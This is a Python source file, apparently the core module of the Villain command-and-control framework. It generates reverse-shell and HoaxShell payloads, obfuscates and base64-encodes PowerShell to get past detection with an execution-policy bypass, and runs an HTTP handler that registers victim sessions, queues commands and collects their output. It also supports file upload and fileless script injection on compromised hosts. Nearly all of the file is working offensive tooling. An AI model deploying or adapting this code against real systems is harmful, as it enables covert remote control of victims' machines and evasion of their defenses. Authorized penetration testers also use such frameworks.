#!/usr/bin/env python3
#
# Author: Panagiotis Chartas (t3l3machus)
#
# This script is part of the "Villain C2 Framework":
# https://github.com/t3l3machus/Villain


import ssl, struct
from http.server import HTTPServer, BaseHTTPRequestHandler
from warnings import filterwarnings
from ast import literal_eval
from .common import *
from .settings import *
from .logging import *

filterwarnings("ignore", category = DeprecationWarning)

registered_services = []


def print_running_services_info():

	if registered_services:
		for entry in registered_services:
			print(f'[{entry["socket"]}]::{entry["service"]}')


class Payload_Generator:

	def __init__(self):

		self.obfuscator = Obfuscator()

		# HoaxShell
		self.constraint_mode_support = ['cmd-curl', 'ps-iex-cm', 'ps-outfile-cm', 'cmd-curl-ssl', 'ps-iex-cm-ssl', 'ps-outfile-cm-ssl', 'sh-curl', 'sh-curl-ssl']
		self.exec_outfile_support = ['ps-outfile', 'ps-outfile-cm', 'ps-outfile-ssl', 'ps-outfile-cm-ssl']



	def encodeUTF16(self, payload):
		enc_payload = "powershell -ep bypass -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
		return enc_payload



	def args_to_dict(self, args_list):

		try:
			args_dict = {}
			boolean_args = []

			for arg in args_list:

				try:
					tmp = arg.split("=")
					args_dict[tmp[0].lower()] = tmp[1]

				except:
					boolean_args.append(tmp[0].lower())

			return [args_dict, boolean_args]

		except:
			return None



	def check_required_args(self, payload_arguments, user_supplied_dict):

		user_supplied = user_supplied_dict.keys()
		missing = subtract_lists(payload_arguments.keys(), user_supplied)

		if missing:
			print(f"Required arguments not supplied: {(', '.join(missing)).upper()}")
			return False

		return True



	def compute_hoaxshell(self, payload, user_args):

		# Create session unique id if type == HoaxShell
		verify = uuid4().hex[0:6]
		get_cmd = uuid4().hex[0:6]
		post_res = uuid4().hex[0:6]
		header_id = 'Authorization' if not Hoaxshell_Settings._header else Hoaxshell_Settings._header
		session_unique_id = '-'.join([verify, get_cmd, post_res])
		exec_outfile = True if payload.meta['type'] in self.exec_outfile_support else False

		# Append data in Session manager
		Sessions_Manager.legit_session_ids[session_unique_id] = {
			'OS Type' : payload.meta['os'].capitalize(),
			'constraint_mode' : True if payload.meta['type'] in self.constraint_mode_support else False,
			'frequency' : payload.config['frequency'],
			'exec_outfile' : exec_outfile,
			'payload_type' : payload.meta['type'],
			'Shell' : payload.meta['shell'],
			'iface' : payload.parameters['lhost']
		}

		# Store legit session metadata (used to restore previously established sessions)
		HoaxShell_Implants_Logger.store_session_details(session_unique_id, Sessions_Manager.legit_session_ids[session_unique_id])

		# Set lhost port
		lhost = f"{payload.parameters['lhost']}:{Hoaxshell_Settings.bind_port}" if not Hoaxshell_Settings.ssl_support \
				else f"{payload.parameters['lhost']}:{Hoaxshell_Settings.bind_port_ssl}"

		# Process payload template
		payload.data = payload.data.replace('*LHOST*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
			payload.config["frequency"])).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id).strip()

		# Parse outfile
		if exec_outfile:
			payload.data = payload.data.replace("*OUTFILE*", payload.config["outfile"])



	def compute_reverse_tcp_payload(self, payload, user_args):

		# Set lhost port
		lport = TCP_Sock_Handler_Settings.bind_port

		# Process payload template
		payload.data = payload.data.replace('*LHOST*', payload.parameters['lhost']).replace('*LPORT*', str(lport)).strip()



	def parse_lhost(self, payload, lhost_value):

		try:
			# Check if valid IP address
			#re.search('[\d]{1,3}[\.][\d]{1,3}[\.][\d]{1,3}[\.][\d]{1,3}', lhost_value)
			payload.parameters["lhost"] = str(ip_address(lhost_value))
			return

		except ValueError:

			try:
				# Check if valid interface
				payload.parameters["lhost"] = ni.ifaddresses(lhost_value)[ni.AF_INET][0]['addr']
				return

			except:
				# Check if valid hostname
				if len(lhost_value) > 255:
					payload.parameters["lhost"] = False
					print('Hostname length greater than 255 characters.')
					return
				if lhost_value[-1] == ".":
					lhost_value = lhost_value[:-1]  # Strip trailing dot (used to indicate an absolute domain name and technically valid according to DNS standards)
				disallowed = re.compile(r"[^A-Z\d-]", re.IGNORECASE)
				if all(len(part) and not part.startswith("-") and not part.endswith("-") and not disallowed.search(part) for part in lhost_value.split(".")):
					# Check if hostname is resolvable
					try:
						socket.gethostbyname(lhost_value)
						payload.parameters["lhost"] = lhost_value
						return
					except:
						print('Failed to resolve LHOST.')
						pass		   	 
		   	 
				payload.parameters["lhost"] = False
				return



	def generate_payload(self, args_list):

		try:

			# Convert args to dict
			user_supplied_args = self.args_to_dict(args_list)
			args_dict = user_supplied_args[0]
			boolean_args = user_supplied_args[1]
			arguments = args_dict.keys()

			if (not args_dict) or (not 'payload' in arguments):
				print(f'Required argument PAYLOAD not supplied.')
				return

			else:

				template_file_path = args_dict.pop('payload').lower()
				module_path = 'Core.payload_templates.' + template_file_path.replace('/', '.')

				if os.path.isfile(f'{cwd}/payload_templates/{template_file_path}.py'):
			   	 
					# Remove the module from sys.modules cache
					try: sys.modules.pop(module_path, None)
					except:	pass

					# Load payload template
					template = import_module(module_path, package = None)
					payload = template.Payload()

					# If payload is the only argument the user supplied, print template info
					if not arguments:
						self.print_template_info(payload)
						del payload, template
						return

					# Check if the user supplied valid required arguments
					valid_args = self.check_required_args(payload.parameters, args_dict)

					if not valid_args:
						del payload, template
						return

					self.parse_lhost(payload, args_dict["lhost"])

					if not payload.parameters["lhost"]:
						print('Error parsing LHOST. Invalid IP, Hostname or Interface.')
						return

					# Check for unrecognized arguments
					unrecognized_args = subtract_lists(args_dict, payload.parameters)
					unrecognized_boolean_args = subtract_lists(boolean_args, payload.attrs)

				else:
					print('Payload template not found.')
					return

			# Process payload template
			print(f'Generating payload...')

			if payload.meta['handler'] == 'hoaxshell':
				self.compute_hoaxshell(payload, args_dict)

			elif payload.meta['handler'] in ['netcat', 'reverse_tcp']:
				self.compute_reverse_tcp_payload(payload, args_dict)

		except:

			del payload, template
			print('Error parsing arguments. Check your input and try again.')
			return

		# Check suplied attributes
		payload.data = self.obfuscator.mask_payload(payload.data) if ('obfuscate' in boolean_args and 'obfuscate' in payload.attrs) else payload.data
		payload.data = self.encodeUTF16(payload.data) if ('encode' in boolean_args and 'encode' in payload.attrs) else payload.data

		# Print a message for each unsupported arguments in user input
		ignored = unrecognized_args + unrecognized_boolean_args
		print(f'Ignoring unsupported arguments: {(", ".join(ignored)).upper()}') if ignored else do_nothing()

		# Print final payload
		print(f'{PLOAD}{payload.data}{END}')

		# Copy payload to clipboard
		try:
			copy2cb(payload.data)
			print(f'{ORANGE}Copied to clipboard!{END}')

		except:
			print(f'{RED}Copy to clipboard failed. You need to do it manually.{END}')

		# Disengage payload template
		del payload, template
		return



	def print_template_info(self, payload):

		info = ['\n']

		try:
			info.append(f'{payload.info["Title"]}\n')

			info.append('\nRequired Arguments\n------------------')
			for key in payload.parameters.keys():
				info.append(f'\n{key.upper()}\n')

			# if payload.config:
			# 	info.append('\nConfiguration\n-------------')
			# 	for key,val in payload.config.items():
			#	 	info.append(f'\n{key} : {val}\n')

			if payload.attrs:
				info.append('\nSupported Utilities\n-------------------\n')
				for key in payload.attrs.keys():
					info.append(f'{key.upper()}\n')
	   	 
			print(''.join(info) + '\n')

		except Exception as e:
			traceback.print_exc()

			print('Payload template exists but seems to have improper format.')



class Obfuscator:

	def __init__(self):

		self.restricted_var_names = ['t', 'tr', 'tru', 'true', 'e', 'en', 'env']
		self.used_var_names = []



	def mask_char(self, char):

		path = randint(1,3)

		if char.isalpha():
			if path == 1:
				return char

			return '\\w' if path == 2 else f'({char}|\\?)'



		elif char.isnumeric():

			if path == 1:
				return char

			return '\\d' if path == 2 else f'({char}|\\?)'



		elif char in '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~':

			if char in ['$^*\\+?']:
				char = '\\' + char

			if path == 1:
				return char

			return '\\W' if path == 2 else f'({char}|\\?)'

		else:
			return None



	def randomize_case(self, string):
		return ''.join(choice((str.upper, str.lower))(c) for c in string)



	def string_to_regex(self, string):

		# First check if string is actually a regex
		if re.match( "^\\[.*\\}$", string):
			return string

		else:

			legal = False

			while not legal:
				regex = ''
				str_length = len(string)
				chars_used = 0
				c = 0

				while True:

					chars_left = (str_length - chars_used)

					if chars_left:
						pair_length = randint(1, chars_left)
						regex += '['

						for i in range(c, pair_length + c):
							masked = self.mask_char(string[i])
							regex += masked
							c += 1

						chars_used += pair_length
						regex += ']{' + str(pair_length) + '}'

					else:
						break

				# Test generated regex
				if re.match(regex, string):
					legal = True

			return regex



	def concatenate_string(self, string):

		str_length = len(string)

		if str_length <= 1:
			return string

		concat = ''
		str_length = len(string)
		chars_used = 0
		c = 0

		while True:
			chars_left = (str_length - chars_used)

			if chars_left:
				pair_length = randint(1, chars_left)
				concat += "'"

				for i in range(c, pair_length + c):
					concat += string[i]
					c += 1

				chars_used += pair_length
				concat = (concat + "'+") if (chars_used < str_length) else (concat + "'")

			else:
				break

		return concat



	def get_random_str(self, main_str, substr_len):

		index = randrange(1, len(main_str) - substr_len + 1)
		return main_str[index : (index + substr_len)]



	def obfuscate_cmdlet(self, main_str):

		main_str_length = len(main_str)
		substr_len = main_str_length - (randint(1, (main_str_length - 2)))
		sub = self.get_random_str(main_str, substr_len)
		sub_quoted = f"'{sub}'"
		obf_cmdlet = main_str.replace(sub, sub_quoted)
		return obf_cmdlet



	def get_rand_var_name(self):

		_max = randint(1,6)
		legal = False

		while not legal:

			obf = str(uuid4())[0:_max]

			if (obf in self.restricted_var_names) or (obf in self.used_var_names):
				continue
			else:
				self.used_var_names.append(obf)
				legal = True

		return obf



	def mask_payload(self, payload):

		# Obfuscate variable name definitions
		variables = re.findall("\\$[A-Za-z0-9_]*={1}", payload)

		if variables:

			for var in variables:
				var = var.strip("=")
				obf = self.get_rand_var_name()
				payload = payload.replace(var, f'${obf}')


		# Randomize error variable name
		obf = self.get_rand_var_name()
		payload = payload.replace('-ErrorVariable e', f'-ErrorVariable {obf}')
		payload = payload.replace('$e+', f'${obf}+')


		# Obfuscate strings
		strings = re.findall(r"'(.+?)'", payload)

		if strings:
			for string in strings:

				if string in ['None', 'quit']:
					string = string.strip("'")
					concat = self.concatenate_string(string)
					payload = payload.replace(f"'{string}'", f'({concat})')

				elif string not in ['', ' ']:

					method = randint(0, 1)

					if method == 0: # String to regex

						_max = randint(3,8)
						random_string = str(uuid4())[0:_max]
						regex = self.string_to_regex(random_string)
						replace_obf = self.randomize_case('-replace')
						payload = payload.replace(f"'{string}'", f"$('{random_string}' {replace_obf} '{regex}','{string}')")

					elif method == 1: # Concatenate string

						submethod = randint(0, 1)
						string = string.strip("'")
						concat = self.concatenate_string(string)

						if submethod == 0: # return raw
							payload = payload.replace(f"'{string}'", concat)

						elif submethod == 1: # return call
							payload = payload.replace(f"'{string}'", f"$({concat})")



		# Randomize the case of each char in parameter names
		ps_parameters = re.findall("\\s-[A-Za-z]*", payload)

		if ps_parameters:
			for param in ps_parameters:
				param = param.strip()
				rand_param_case = self.randomize_case(param)
				payload = payload.replace(param, rand_param_case)



		# Spontaneous replacements
		alternatives = {
			'Invoke-WebRequest' : 'iwr',
			'Invoke-Expression' : 'iex',
			'Invoke-RestMethod' : 'irm'
		}

		for alt in alternatives.keys():

			p = randint(0,1)

			if p == 0:
				payload = payload.replace(alt, alternatives[alt])

			else:
				pass




		components = ['USERNAME', 'COMPUTERNAME', 'Out-String', 'Invoke-WebRequest', 'iwr', \
		'Stop', 'System.Text.Encoding', 'UTF8.GetBytes', 'sleep', 'Invoke-Expression', 'iex', \
		'Invoke-RestMethod', 'irm', 'Start-Process', 'Hidden', 'add-type']

		# Randomize char case of specified components
		for i in range(0, len(components)):
			rand_case = self.randomize_case(components[i])
			payload = payload.replace(components[i], rand_case)
			components[i] = rand_case


		# Obfuscate specified components
		for i in range(0, len(components)):
			if (components[i].count('.') == 0) and components[i].lower() not in ['while', 'username', 'computername']:
				obf_cmdlet = self.obfuscate_cmdlet(components[i])
				payload = payload.replace(components[i], obf_cmdlet)

		self.used_var_names = []
		return payload




class Sessions_Manager:

	active_sessions = {}
	legit_session_ids = {}
	sessions_graveyard = []
	aliases = []
	shell_redirectors = {}

	# Hoaxshell
	verify = []
	get_cmd = []
	post_res = []

	# Load past generated legit session payload details (if beacon is still alive they may be re-establish)
	past_generated_sessions = HoaxShell_Implants_Logger.retrieve_past_sessions_data()

	if past_generated_sessions:

		sessions_data = literal_eval(past_generated_sessions)

		for id in sessions_data.keys():
	   	 
			legit_session_ids[id] = sessions_data[id]
			h = id.split('-')
			verify.append(h[0])
			get_cmd.append(h[1])
			post_res.append(h[2])

		del sessions_data
	del past_generated_sessions


	def repair(self, session_id, key, new_val):

		key = 'Computername' if key == 'hostname' else key
		key = key.capitalize() if key == 'username' else key
		valid = self.repair_val_check(new_val)

		if valid == 0:

			try:
				self.active_sessions[session_id][key] = new_val
				Core_Server.broadcast({session_id : {key : new_val}}, 'repair')
				return 0

			except:
				return ['Failed to repair value.']

		else:
			return valid



	def repair_val_check(self, value):

		if value[0] == '-':
			return [f'Value cannot begin with a hyphen.']

		length = len(value)

		if length >= 2 and length <= 15:

			valid = ascii_uppercase + ascii_lowercase + '-' + digits

			for char in value:
				if char not in valid:
					return [f'Value includes illegal character: "{char}".']

			return 0

		else:
			return ['length must be between 2 to 15 characters.']



	def list_sessions(self):

		if self.active_sessions.keys():

			print('\r')
			table = self.sessions_dict_to_list()
			print_table(table, ['Session ID', 'IP Address', 'OS Type', 'User', 'Owner', 'Status'])
			print('\r')

		else:
			print(f'No active sessions.')



	def list_backdoors(self):

		if self.active_sessions.keys():

			print('\r')
			table = self.sessions_dict_to_list()
			print_table(table, ['Session ID', 'IP Address', 'Shell', 'Listener', 'Stability', 'Status'])
			print('\r')

		else:
			print(f'No active sessions.')



	def sessions_dict_to_list(self):

		sessions_list = []
		active_sessions_clone = deepcopy(self.active_sessions)

		for session_id in active_sessions_clone.keys():

			tmp = active_sessions_clone[session_id]
			corrupted = 0

			try:
				tmp['Session ID'] = session_id if not tmp['aliased'] else tmp['alias']

				tmp['Owner'] = 'Self' if tmp['self_owned'] \
				else Core_Server.sibling_servers[self.return_session_attr_value(session_id, 'Owner')]['Hostname']

				tmp['User'] = f"{tmp['Computername']}\\{tmp['Username']}" if tmp['OS Type'] == 'Windows' \
				else f"{tmp['Username']}@{tmp['Computername']}"

				sessions_list.append(tmp)

			except KeyError:
				corrupted += 1

		if corrupted:
			print(f'\r[{WARN}] {corrupted} x Corrupted session data entries omitted.')
			print(f'[{WARN}] Possible reason: Incomplete payload execution on victim.\n')

		del active_sessions_clone, tmp
		return sessions_list



	@staticmethod
	def return_session_attr_value(session_id, attr):

		if session_id in Sessions_Manager.active_sessions.keys():
			return Sessions_Manager.active_sessions[session_id][attr]

		else:
			return None



	@staticmethod
	def alias_to_session_id(alias):

		active_sessions_clone = deepcopy(Sessions_Manager.active_sessions)
		active_sessions = active_sessions_clone.keys()
		sid = False

		if alias in active_sessions:
			sid = alias

		else:
			for session_id in active_sessions:
				if active_sessions_clone[session_id]['aliased']:
					if active_sessions_clone[session_id]['alias'] == alias:
						sid = session_id
						break

		del active_sessions_clone, active_sessions
		return sid



	@staticmethod
	def sessions_check(session_id = False):

		sessions = Sessions_Manager.active_sessions.keys()

		if not sessions:
			return [False, '\rNo active sessions.']

		elif session_id not in sessions:
			return [False, '\rInvalid session ID.']

		return [True]



	def kill_session(self, session_id):

		if session_id in self.active_sessions.keys():
			if self.active_sessions[session_id]['Owner'] == Core_Server.SERVER_UNIQUE_ID:
				self.sessions_graveyard.append(session_id)

				#if self.active_sessions[session_id]['Status'] != 'Lost':
				Hoaxshell.dropSession(session_id)

				if self.active_sessions[session_id]['Listener'] == 'hoaxshell':
					sleep(self.active_sessions[session_id]['frequency'])
					session_id_components = session_id.split('-')
					Sessions_Manager.verify.remove(session_id_components[0])
					Sessions_Manager.get_cmd.remove(session_id_components[1])
					Sessions_Manager.post_res.remove(session_id_components[2])

				self.active_sessions.pop(session_id, None)
				#self.legit_session_ids.pop(session_id, None)
				del Hoaxshell.command_pool[session_id]

				print(f'[{INFO}] Session terminated.')
				Core_Server.announce_session_termination({'session_id' : session_id})

			else:
				print(f'[{ERR}] Permission denied. This session is owned by a sibling server.')

		else:
			print('Session id not found in active sessions.')



# -------------- Hoaxshell Server -------------- #
class Hoaxshell(BaseHTTPRequestHandler):

	server_name = 'HoaxShell Multi-Handler'
	header_id = Hoaxshell_Settings._header
	server_unique_id = None
	command_pool = {}

	# Shell
	active_shell = None
	prompt_ready = False
	hoax_prompt = ''


	@staticmethod
	def set_shell_prompt_ready():
		Hoaxshell.prompt_ready = True


	@staticmethod
	def search_output_for_signature(output):

		try:
			sibling_server_id = re.findall("{[a-zA-Z0-9]{32}}", output)[-1].strip("{}")
		except:
			sibling_server_id = None

		return sibling_server_id



	def cmd_output_interpreter(self, session_id, output, constraint_mode = False):

		payload_type = Sessions_Manager.legit_session_ids[session_id]['payload_type']

		try:

			if constraint_mode:
				output = output.decode('utf-8', 'ignore').strip()
				if re.search('cmd-curl', payload_type):
					try:
						output = output.split('\n', 1)[1]
					except:
						output = None

			else:
				try:
					bin_output = output.decode('utf-8').split(' ')
					to_b_numbers = [ int(n) for n in bin_output ]
					b_array = bytearray(to_b_numbers)
					output = b_array.decode('utf-8', 'ignore')
				except ValueError:
					output = None

			# Check if command was issued by a sibling server
			if session_id in Sessions_Manager.shell_redirectors.keys():
				sibling_id  = Sessions_Manager.shell_redirectors[session_id]
			else:
				sibling_id = False

		except UnicodeDecodeError:
			print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')

		if output:

			if isinstance(output, str):
				output = output.strip() + '\n' if output.strip() != '' else output.strip()
			elif isinstance(output, bytes):
				output = str(output)

		return output if not sibling_id else [sibling_id, output]



	@staticmethod
	def activate_pseudo_shell_session(session_id, os_type):

		session_data = Sessions_Manager.active_sessions[session_id]
		is_remote_shell = True if not session_data['self_owned'] else False
		# prompt = session_data['prompt']
		shell_type = session_data['Shell']
		listener = session_data['Listener']
		hostname = session_data['Computername']
		uname = session_data['Username']
		Hoaxshell.active_shell = session_id
		Hoaxshell.prompt_ready = True

		# Print pseudo-shell info
		activation_msg = 'Interactive pseudo-shell activated.\nPress Ctrl + C or type "exit" to deactivate.\n'
		stable = True if Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Stable' else False

		if not stable:
			print(f'\n{BOLD}This session is unstable. Consider running a TCP reverse shell process in it{END}.')

		print(f'\n{activation_msg}' if stable else activation_msg)

		# Check if there are any redirectors. Normally, there shouldn't be any
		# if the session is self-owned. This function (activate_pseudo_shell_session) running  
		# means the session is not occupied by a sibling.
		if session_id in Sessions_Manager.shell_redirectors.keys():
			print(f'{ATT} There\'s an active redirector set for this session.')

		# Init command pool
		if Hoaxshell.active_shell not in Hoaxshell.command_pool.keys():
			Hoaxshell.command_pool[Hoaxshell.active_shell] = []

		if is_remote_shell:

			# Get the shell session owner's sibling ID
			session_owner_id = Sessions_Manager.return_session_attr_value(session_id, 'Owner')

			# Set output redirector on the sibling server
			req_data = {'session_id' : session_id}
			response = Core_Server.send_receive_one_encrypted(session_owner_id, req_data, 'set_redirector', Core_Server_Settings.timeout_for_command_output)

			Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, '')

		if listener == 'hoaxshell':
			Main_prompt.hoax_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
		else:
			Hoaxshell.command_pool[Hoaxshell.active_shell].append('') 

		# Pseudo shell
		try:

			while Hoaxshell.active_shell:
				if Hoaxshell.prompt_ready:

					user_input = input(Main_prompt.hoax_prompt) if listener == 'hoaxshell' else input()
					user_input_clean = re.sub(' +', ' ', user_input).strip()
					cmd_list = user_input_clean.split(' ')
					cmd_list_len = len(cmd_list)
					cmd_list[0] = cmd_list[0].lower()

					if cmd_list[0] == 'clear':
						os.system('clear')
						if listener == 'reverse tcp':
							if is_remote_shell:
								Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, '')
							else:
								Hoaxshell.command_pool[Hoaxshell.active_shell].append('')
						else:
							continue



					elif cmd_list[0] == 'upload':

						Hoaxshell.prompt_ready = False
						file_path = os.path.expanduser(cmd_list[1])
						try:
							out_path = cmd_list[2]
						except IndexError:
							out_path = os.path.basename(cmd_list[1])

						if session_id in Sessions_Manager.active_sessions.keys():

							# Check if file exists
							if os.path.isfile(file_path):

								# Get file contents
								file_contents = get_file_contents(file_path)

								if file_contents:

									# Check who is the owner of the shell session
									session_owner_id = Sessions_Manager.return_session_attr_value(session_id, 'Owner')

									if session_owner_id == Core_Server.return_server_uniq_id():
										File_Smuggler.upload_file(file_contents, out_path, session_id)

									else:
										Core_Server.send_receive_one_encrypted(session_owner_id, [file_contents, out_path, session_id], 'upload_file')

							else:
								print(f'\r[{ERR}] file {file_path} not found.')
								Hoaxshell.set_shell_prompt_ready()



					elif cmd_list[0] == 'inject':

						execution_object = cmd_list[1]
						shell_type = Sessions_Manager.active_sessions[session_id]['Shell']

						if shell_type not in File_Smuggler.Utilities['fileless_exec']['supported']:
							print(f'\r[{INFO}] Script execution not supported for shell type "{shell_type}"')
							continue

						if execution_object[0] in [os.sep, '~']:
							file_path = os.path.expanduser(execution_object)
							is_file = True if os.path.isfile(file_path) else False
							
							try:

								if is_file:
									# Check if file is empty
									execution_object = get_file_contents(file_path, 'r')
									
									if not execution_object: 
										raise				
									try:
										if not execution_object.strip('\n\r\t '):
											print(f'\r[{WARN}] File "{file_path}" is empty.')
											continue
									except:
										raise
							except:
								print(f'\r[{ERR}] Failed to read file {file_path}.')
								continue						

						# Check the session's stability and warn user
						approved = True

						# if Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Unstable':
						# 	try:
						# 		choice = input(f'\r[{WARN}] This session is unstable. Running I/O-intensive commands may cause it to hang. Proceed? [y/n]: ')
						# 		approved = True if choice.lower().strip() in ['yes', 'y'] else False
						# 	except:
						# 		print()
						# 		approved = False

						if approved:
							# Check who is the owner of the shell session
							session_owner_id = Sessions_Manager.return_session_attr_value(session_id, 'Owner')
							
							if session_owner_id == Core_Server.return_server_uniq_id():
								File_Smuggler.fileless_exec(execution_object, session_id, issuer = 'self')
							else:
								Core_Server.send_receive_one_encrypted(session_owner_id, [execution_object, session_id], 'exec_file')

							Hoaxshell.prompt_ready = False

						else:
							continue	



					elif cmd_list[0] in ['exit', 'quit']:
						raise KeyboardInterrupt



					elif  cmd_list[0] == 'cmdinspector':

						try:
							option = cmd_list[1]
						except:
							option = ''

						if option in ['on', 'off']:

							if option == 'off':
								Session_Defender.is_active = False
							elif option == 'on':
								Session_Defender.is_active = True

							print(f'Session Defender is turned {option}.')

						else:
							print('Value can be on or off.')



					elif user_input.strip() == '' and listener == 'hoaxshell':
						continue



					elif user_input in Core_Server.requests.keys():
						Core_Server.requests[user_input] = True


					elif user_input == 'help':					
						if cmd_list_len == 1:
							PrompHelp.print_main_help_msg()
											
						elif cmd_list_len == 2:
							PrompHelp.print_detailed(cmd_list[1]) if cmd_list[1] in PrompHelp.commands.keys() \
							else print(f'Command {cmd_list[1] if len(cmd_list[1]) <= 10 else f"{cmd_list[1][0:4]}..{cmd_list[1][-4:]}" } does not exist.')

						continue

					# Run user input as shell command
					else:
						if Hoaxshell.active_shell:
							Hoaxshell.prompt_ready = False

							# Invoke Session Defender to inspect the command for dangerous input
							dangerous_input_detected = False

							if Session_Defender.is_active:
								dangerous_input_detected = Session_Defender.inspect_command(Sessions_Manager.active_sessions[session_id]['OS Type'], user_input)

							if dangerous_input_detected:
								Session_Defender.print_warning()

							else:
								# Wrap stderr if shell ==unix
								if shell_type in ['unix', 'zsh'] and listener == 'hoaxshell':
									user_input = Exec_Utils.unix_stderr_wrapper(user_input)

								# Append command for execution
								if is_remote_shell:
									Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, user_input)

								else:
									Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)
						else:
							print(f'\rNo active session.')
				else:
					sleep(0.1)
					continue
			else:
				raise KeyboardInterrupt


		except KeyboardInterrupt:
			# Remove any redirectors
			if is_remote_shell:
				req_data = {'session_id' : session_id}
				response = Core_Server.send_receive_one_encrypted(session_owner_id, req_data, 'pop_redirector', Core_Server_Settings.timeout_for_command_output)

			Hoaxshell.command_pool[Hoaxshell.active_shell] = []
			print('\r')
			Hoaxshell.deactivate_shell()



	@staticmethod
	def deactivate_shell():

		Hoaxshell.active_shell = None
		Hoaxshell.prompt_ready = False
		Main_prompt.hoax_prompt = ''
		Main_prompt.ready = True
		print()



	@staticmethod
	def rst_shell_prompt(prompt = '', prefix = '\r'):

		Hoaxshell.prompt_ready = True
		lb = global_readline.get_line_buffer()
		lb_data = lb if lb else ''
		prompt = Main_prompt.hoax_prompt if Main_prompt.hoax_prompt else ''
		sys.stdout.write(prompt + lb_data) # prefix + Main_prompt.hoax_prompt +



	def do_GET(self):

		timestamp = int(datetime.now().timestamp())

		# Identify session
		if not Hoaxshell.header_id:
			header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
			Hoaxshell.header_id = f'X-{header_id_extract[0]}'

		try:
			session_id = self.headers.get(Hoaxshell.header_id)

		except:
			session_id = None


		if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):

			if session_id in Sessions_Manager.legit_session_ids.keys():
				h = session_id.split('-')
				Sessions_Manager.verify.append(h[0])
				Sessions_Manager.get_cmd.append(h[1])
				Sessions_Manager.post_res.append(h[2])

				Sessions_Manager.active_sessions[session_id] = {
					'IP Address' : self.client_address[0],
					'Port' : self.client_address[1],
					'execution_verified' : False,
					'Status' : 'Active',
					'last_received' : timestamp,
					'OS Type' : Sessions_Manager.legit_session_ids[session_id]['OS Type'],
					'frequency' : Sessions_Manager.legit_session_ids[session_id]['frequency'],
					'Owner' : Hoaxshell.server_unique_id,
					'self_owned' : True,
					'aliased' : False,
					'alias' : None,
					'Listener' : 'hoaxshell',
					'Shell' : Sessions_Manager.legit_session_ids[session_id]['Shell'],
					'iface' : Sessions_Manager.legit_session_ids[session_id]['iface'],
					'prompt' : None,
					'Stability' : 'Unstable'
				}

				Hoaxshell.command_pool[session_id] = []

		elif session_id and (session_id in Sessions_Manager.active_sessions.keys()):
			Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp


		elif not session_id:
			return

		self.server_version = Hoaxshell_Settings.server_version
		self.sys_version = ""
		session_id = self.headers.get(Hoaxshell.header_id)
		legit = True if session_id in Sessions_Manager.legit_session_ids.keys() else False


		# Verify execution
		url_split = self.path.strip("/").split("/")

		if (url_split[0] in Sessions_Manager.verify and legit) or \
		(legit and session_id in Sessions_Manager.active_sessions and not Sessions_Manager.active_sessions[session_id]['execution_verified']):

			if Sessions_Manager.active_sessions[session_id]['execution_verified']:
				print_to_prompt(f'\r[{INFO}] Received "Verify execution" request from an already established session (ignored).')
				return

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()
			self.wfile.write(bytes('OK', "utf-8"))
			Sessions_Manager.active_sessions[session_id]['execution_verified'] = True
	   	 
			try:
				Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]
				Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]
				print_to_prompt(f'\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()}.')

			except IndexError:
				Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'
				Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'
				print_to_prompt(f'\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')
		   	 
			try:
				Thread(target = self.monitor_shell_state, args = (session_id,), name = f'session_state_monitor_{self.client_address[0]}', daemon = True).start()
			except:
				pass

			new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])
			new_session_data['session_id'] = session_id
			new_session_data['alias'] = None
			new_session_data['aliased'] = False
			new_session_data['self_owned'] = False
			Core_Server.announce_new_session(new_session_data)
			del new_session_data


		# Grab cmd
		elif self.path.strip("/") in Sessions_Manager.get_cmd and legit:

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()

			if len(Hoaxshell.command_pool[session_id]):

				# villain_issued_cmd = False
				cmd = Hoaxshell.command_pool[session_id].pop(0)

				# Check command type:
				# 1. type str = normal
				# 2. type dict = Villain issued cmd

				if isinstance(cmd, dict):
					# villain_issued_cmd = True
					# quiet = cmd['quiet']
					cmd = cmd['data']


				self.wfile.write(bytes(cmd, 'utf-8'))

			else:
				self.wfile.write(bytes('None', 'utf-8'))

			Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp
			return


		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'')
			# self.wfile.write(b'exit 1') # kills crippled hoaxshell sessions that continue to spam requests
			pass



	def do_POST(self):

		timestamp = int(datetime.now().timestamp())
		session_id = self.headers.get(self.header_id)
		legit = True if (session_id in Sessions_Manager.legit_session_ids.keys()) else False

		if legit:

			try:
				Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp
				self.server_version = Hoaxshell_Settings.server_version
				self.sys_version = ""

				# cmd output
				if self.path.strip("/") in Sessions_Manager.post_res and legit and\
				session_id in Sessions_Manager.active_sessions.keys():

					try:
						self.send_response(200)
						self.send_header('Content-Type', 'text/plain')
						self.end_headers()
						self.wfile.write(b'OK')
						content_len = int(self.headers.get('Content-Length'))
						output = None
						output = self.rfile.read(content_len)
